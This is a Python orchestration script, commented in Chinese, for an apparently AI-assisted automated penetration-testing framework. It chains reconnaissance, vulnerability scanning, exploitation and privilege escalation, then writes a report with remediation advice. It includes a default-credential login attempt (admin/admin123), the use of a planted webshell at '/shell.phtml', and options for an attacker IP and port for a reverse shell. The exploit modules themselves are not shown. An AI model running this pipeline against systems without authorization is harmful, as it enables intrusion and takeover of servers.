import time
from ai_pentest_brain import AIPentestBrain
from auto_pentest_bot import AutoPentestBot
from log_utils import logger

class AIBotPipeline:
    def __init__(self, target_url, attack_ip, attack_port):
        self.target = target_url
        self.attack_ip = attack_ip
        self.attack_port = attack_port
        # 初始化AI和机器人
        self.ai = AIPentestBrain()
        self.bot = AutoPentestBot(target_url, attack_ip, attack_port)
        # 全流程状态记录
        self.pipeline_status = {
            "info_collection": False,
            "business_vuln_scan": False,
            "vuln_exploit": False,
            "privesc": False,
            "report_generated": False
        }

    def run_full_pipeline(self):
        """AI+机器人联动全流程（文档一条龙渗透测试）"""
        logger.log_main(f"===== AI+机器人联动渗透启动（目标：{self.target}） =====")
        start_time = time.time()

        # 1. 阶段1：AI指导机器人信息收集
        logger.log_main(f"\n[阶段1] 信息收集（AI规划路径）")
        info_result = self.bot.run_info_collection()
        if info_result:
            self.pipeline_status["info_collection"] = True
            logger.log_main(f"[阶段1] 信息收集完成，发现子域：{len(info_result['subdomains'])}个，敏感文件：{len(info_result['sensitive_files'])}个")

        # 2. 阶段2：业务逻辑漏洞扫描（新增功能）
        logger.log_main(f"\n[阶段2] 业务逻辑漏洞扫描")
        # 尝试从登录页面获取cookie（实际场景可自动爆破弱口令获取）
        login_cookie = self._get_login_cookie()
        business_results = self.bot.run_business_vuln_scan(login_cookie)
        if business_results:
            self.pipeline_status["business_vuln_scan"] = True
            logger.log_main(f"[阶段2] 业务逻辑漏洞扫描完成，发现{len(business_results)}个漏洞")

        # 3. 阶段3：AI决策+机器人漏洞利用
        logger.log_main(f"\n[阶段3] 漏洞利用（AI决策漏洞类型）")
        if self.bot.run_vuln_exploit():
            self.pipeline_status["vuln_exploit"] = True
            logger.log_main(f"[阶段3] 漏洞利用成功")
        else:
            logger.log_main(f"[阶段3] 漏洞利用失败，终止流程")
            self._generate_final_report()
            return

        # 4. 阶段4：AI分析+机器人自动提权
        logger.log_main(f"\n[阶段4] 自动提权（AI匹配提权策略）")
        # AI分析目标系统类型（从信息收集结果中提取）
        os_type = self._get_os_type_from_info()
        logger.log_main(f"[阶段4] AI分析目标系统：{os_type}")
        # 假设已获取WebShell（漏洞利用成功后）
        shell_url = f"{self.target}/shell.phtml"  # 实际从漏洞利用结果中提取
        shell_pass = "shell"
        if self.bot.run_privesc(shell_url, shell_pass):
            self.pipeline_status["privesc"] = True
            logger.log_main(f"[阶段4] 提权成功")

        # 5. 阶段5：生成全流程报告（文档报告生成逻辑）
        logger.log_main(f"\n[阶段5] 生成渗透报告")
        self._generate_final_report()

        # 输出总耗时
        total_time = time.time() - start_time
        logger.log_main(f"\n===== 全流程渗透结束（总耗时：{total_time:.0f}秒） =====")
        logger.log_main(f"最终状态：{self.pipeline_status}")
        # 关闭日志
        logger.close()

    def _get_login_cookie(self):
        """尝试获取登录Cookie（实际场景可扩展为弱口令爆破）"""
        try:
            login_url = f"{self.target}/login.php"
            data = {"username": "admin", "password": "admin123"}  # 尝试默认弱口令
            res = requests.post(login_url, data=data, headers=self.bot.headers, timeout=5, verify=False)
            if "Set-Cookie" in res.headers:
                return res.headers["Set-Cookie"]
            return None
        except:
            return None

    def _get_os_type_from_info(self):
        """AI从信息收集结果中分析系统类型（文档系统识别逻辑）"""
        with open("info_report.md", "r") as f:
            report = f.read()
        if "Linux" in report or "ubuntu" in report.lower():
            return "Linux"
        elif "Windows" in report or "win32" in report.lower():
            return "Windows"
        else:
            return "Unknown"

    def _generate_final_report(self):
        """生成全流程渗透报告（文档合规性报告逻辑）"""
        report = f"# AI+机器人联动渗透测试报告\n"
        report += f"## 1. 测试概述\n"
        report += f"- 目标URL：{self.target}\n"
        report += f"- 测试时间：{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"- 测试结果：{'成功（获取高权限）' if self.pipeline_status['privesc'] else '部分成功（未提权）'}\n"
        report += f"\n## 2. 各阶段状态\n"
        for stage, status in self.pipeline_status.items():
            report += f"- {stage.replace('_', ' ')}：{'成功' if status else '失败'}\n"
        report += f"\n## 3. 漏洞详情（AI识别）\n"
        ai_vuln = self.ai.predict_vuln(self.target)
        report += f"- 预测漏洞类型：{ai_vuln['vuln_type']}\n"
        report += f"- 利用策略：{ai_vuln['strategy']['tools'] if ai_vuln['strategy'] else '无'}\n"
        report += f"\n## 4. 修复建议（文档合规建议）\n"
        report += f"1. 信息泄露：删除敏感备份文件，限制robots.txt访问\n"
        report += f"2. {ai_vuln['vuln_type']}：{self._get_fix_suggestion(ai_vuln['vuln_type'])}\n"
        report += f"3. 提权防护：更新系统内核，限制SUID文件权限\n"
        # 保存报告
        report_filename = f"ai_bot_pentest_report_{self.target.replace('http://','').replace('/','_')}.md"
        with open(report_filename, "w", encoding="utf-8") as f:
            f.write(report)
        self.pipeline_status["report_generated"] = True
        logger.log_main(f"[报告] 全流程报告已保存：{report_filename}")

    def _get_fix_suggestion(self, vuln_type):
        """根据漏洞类型生成修复建议（文档修复方案）"""
        fix_map = {
            "SQL注入": "使用PreparedStatement预编译语句，避免SQL拼接",
            "ThinkPHP RCE": "升级ThinkPHP至最新版本，禁用危险函数",
            "文件上传": "校验文件后缀+MIME类型，存储路径与Web根目录分离",
            "XSS": "输入过滤与输出编码，使用CSP策略",
            "Log4j注入": "升级Log4j至2.17.0+，设置log4j2.formatMsgNoLookups=true"
        }
        return fix_map.get(vuln_type, "升级对应组件至最新版本")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AI+机器人联动渗透测试框架")
    parser.add_argument("-u", "--url", required=True, help="目标URL（如http://target.com）")
    parser.add_argument("-ip", "--attack-ip", help="攻击机IP（用于反弹Shell）")
    parser.add_argument("-p", "--attack-port", type=int, help="攻击机端口（用于反弹Shell）")
    args = parser.parse_args()

    # 启动AI+机器人全流程渗透
    pipeline = AIBotPipeline(
        target_url=args.url,
        attack_ip=args.attack_ip,
        attack_port=args.attack_port
    )
    pipeline.run_full_pipeline()
